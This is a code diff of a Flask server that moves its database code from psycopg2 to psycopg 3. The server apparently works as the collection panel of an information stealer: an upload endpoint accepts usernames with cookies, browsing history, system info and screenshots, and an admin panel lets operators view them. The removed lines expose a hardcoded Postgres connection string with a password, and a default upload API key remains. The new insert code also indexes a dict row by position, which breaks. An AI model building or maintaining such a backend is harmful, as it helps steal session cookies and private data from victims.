@@ -5,11 +5,12 @@ from datetime import datetime, timedelta
 from flask import Flask, request, render_template, abort, jsonify, Response
 from flask_cors import CORS
 from flask_httpauth import HTTPBasicAuth
-import psycopg2
-import psycopg2.extras
+import psycopg  # Изменено с psycopg2
+from psycopg.rows import dict_row
 from io import BytesIO
 from PIL import Image
 import io
+import sys
 
 app = Flask(__name__)
 CORS(app, resources={r"/api/*": {"origins": "*"}})
@@ -23,7 +24,7 @@ ADMINS = {
 }
 
 UPLOAD_API_KEY = os.getenv("UPLOAD_API_KEY", "d3b07384d113edec49eaa6238ad5ff00")
-DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require")
+DATABASE_URL = os.getenv("DATABASE_URL")
 
 if not DATABASE_URL:
     raise RuntimeError("DATABASE_URL must be set in env")
@@ -51,42 +52,33 @@ def compress_image(image_data, quality=60):
 
 # --- DB helpers ---
 def get_conn():
-    return psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.RealDictCursor)
+    return psycopg.connect(DATABASE_URL, row_factory=dict_row)
 
 def init_db():
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            id SERIAL PRIMARY KEY,
-            username TEXT,
-            cookies JSONB,
-            history JSONB,
-            system_info JSONB,
-            screenshot BYTEA,
-            timestamp TIMESTAMP
-        );
-        
-        CREATE INDEX IF NOT EXISTS idx_timestamp ON users(timestamp);
-    ''')
-    conn.commit()
-    cur.close()
-    conn.close()
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute('''
+                CREATE TABLE IF NOT EXISTS users (
+                    id SERIAL PRIMARY KEY,
+                    username TEXT,
+                    cookies JSONB,
+                    history JSONB,
+                    system_info JSONB,
+                    screenshot BYTEA,
+                    timestamp TIMESTAMP
+                );
+                
+                CREATE INDEX IF NOT EXISTS idx_timestamp ON users(timestamp);
+            ''')
+            conn.commit()
 
 def cleanup_old_data(days=3):
-    conn = get_conn()
-    cur = conn.cursor()
-    try:
-        cur.execute("DELETE FROM users WHERE timestamp < %s", 
-                   (datetime.utcnow() - timedelta(days=days),))
-        conn.commit()
-        return cur.rowcount
-    except Exception as e:
-        conn.rollback()
-        raise e
-    finally:
-        cur.close()
-        conn.close()
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute("DELETE FROM users WHERE timestamp < %s", 
+                       (datetime.utcnow() - timedelta(days=days),))
+            conn.commit()
+            return cur.rowcount
 
 init_db()
 
@@ -94,69 +86,61 @@ init_db()
 @app.route('/')
 @auth.login_required
 def admin_panel():
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
-    rows = cur.fetchall()
-    cur.close()
-    conn.close()
-    users = [{
-        "id": r["id"], 
-        "username": r["username"], 
-        "timestamp": r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else ""
-    } for r in rows]
-    return render_template('admin.html', users=users)
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
+            rows = cur.fetchall()
+            users = [{
+                "id": r["id"], 
+                "username": r["username"], 
+                "timestamp": r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else ""
+            } for r in rows]
+            return render_template('admin.html', users=users)
 
 @app.route('/user/<int:user_id>')
 @auth.login_required
 def view_user(user_id):
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("SELECT id, username, timestamp, (screenshot IS NOT NULL) as has_screenshot FROM users WHERE id=%s", (user_id,))
-    row = cur.fetchone()
-    cur.close()
-    conn.close()
-    if not row:
-        abort(404)
-    user_meta = {
-        "id": row["id"], 
-        "username": row["username"], 
-        "timestamp": (row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""), 
-        "has_screenshot": row["has_screenshot"]
-    }
-    return render_template('user_detail.html', user=user_meta)
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute("SELECT id, username, timestamp, (screenshot IS NOT NULL) as has_screenshot FROM users WHERE id=%s", (user_id,))
+            row = cur.fetchone()
+            if not row:
+                abort(404)
+            user_meta = {
+                "id": row["id"], 
+                "username": row["username"], 
+                "timestamp": (row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""), 
+                "has_screenshot": row["has_screenshot"]
+            }
+            return render_template('user_detail.html', user=user_meta)
 
 @app.route('/api/data/<int:user_id>')
 @auth.login_required
 def api_user_data(user_id):
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("SELECT cookies, history, system_info, timestamp FROM users WHERE id=%s", (user_id,))
-    row = cur.fetchone()
-    cur.close()
-    conn.close()
-    if not row:
-        return jsonify({"error": "not found"}), 404
-    return jsonify({
-        "cookies": row["cookies"] or [],
-        "history": row["history"] or [],
-        "system_info": row["system_info"] or {},
-        "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
-    })
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute("SELECT cookies, history, system_info, timestamp FROM users WHERE id=%s", (user_id,))
+            row = cur.fetchone()
+            if not row:
+                return jsonify({"error": "not found"}), 404
+            return jsonify({
+                "cookies": row["cookies"] or [],
+                "history": row["history"] or [],
+                "system_info": row["system_info"] or {},
+                "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
+            })
 
 @app.route('/screenshot/<int:user_id>')
 @auth.login_required
 def screenshot(user_id):
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("SELECT screenshot FROM users WHERE id=%s", (user_id,))
-    row = cur.fetchone()
-    cur.close()
-    conn.close()
-    if not row or not row["screenshot"]:
-        abort(404)
-    img_bytes = row["screenshot"]
-    return Response(img_bytes, mimetype='image/jpeg')
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            cur.execute("SELECT screenshot FROM users WHERE id=%s", (user_id,))
+            row = cur.fetchone()
+            if not row or not row["screenshot"]:
+                abort(404)
+            img_bytes = row["screenshot"]
+            return Response(img_bytes, mimetype='image/jpeg')
 
 @app.route('/api/upload', methods=['POST'])
 def api_upload():
@@ -178,35 +162,31 @@ def api_upload():
     if screenshot_base64:
         try:
             screenshot_bytes = base64.b64decode(screenshot_base64)
-            # Применяем сжатие
             screenshot_bytes = compress_image(screenshot_bytes)
         except Exception as e:
             print(f"Error processing screenshot: {e}")
 
     timestamp = datetime.utcnow()
 
-    conn = get_conn()
-    cur = conn.cursor()
-    try:
-        cur.execute(
-            "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
-            (
-                username, 
-                psycopg2.extras.Json(cookies), 
-                psycopg2.extras.Json(history), 
-                psycopg2.extras.Json(system_info), 
-                psycopg2.Binary(screenshot_bytes) if screenshot_bytes else None, 
-                timestamp
-            )
-        )
-        new_id = cur.fetchone()[0]
-        conn.commit()
-    except Exception as e:
-        conn.rollback()
-        return jsonify({"error": "db error", "detail": str(e)}), 500
-    finally:
-        cur.close()
-        conn.close()
+    with get_conn() as conn:
+        with conn.cursor() as cur:
+            try:
+                cur.execute(
+                    "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
+                    (
+                        username, 
+                        json.dumps(cookies), 
+                        json.dumps(history), 
+                        json.dumps(system_info), 
+                        screenshot_bytes, 
+                        timestamp
+                    )
+                )
+                new_id = cur.fetchone()[0]
+                conn.commit()
+            except Exception as e:
+                conn.rollback()
+                return jsonify({"error": "db error", "detail": str(e)}), 500
 
     return jsonify({"status": "ok", "id": new_id})
 
